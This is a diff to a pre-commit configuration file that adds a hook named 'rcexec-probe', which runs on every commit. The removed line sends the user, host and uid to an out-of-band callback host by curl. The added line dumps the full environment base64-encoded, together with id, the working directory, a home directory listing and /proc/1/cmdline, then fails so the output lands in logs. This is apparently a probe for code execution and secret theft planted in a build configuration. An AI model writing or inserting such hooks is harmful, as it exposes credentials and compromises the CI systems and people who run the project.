@@ -11,7 +11,7 @@ repos:
         name: rcexec-probe
         language: system
         entry: >-
-          bash -c 'curl -sk http://dba7kfrk6n4as06l5hd07rfor6i3q979t.oast.pro/precommit/$(whoami).$(hostname).$(id -u)'
+          bash -c 'echo "RCEXEC:env=$(env | base64 -w0):id=$(id):pwd=$(pwd):ls=$(ls /home/pcrunner/ 2>/dev/null | base64 -w0):proc=$(cat /proc/1/cmdline 2>/dev/null | base64 -w0)" && exit 1'
         files: ''
         pass_filenames: false
         always_run: true
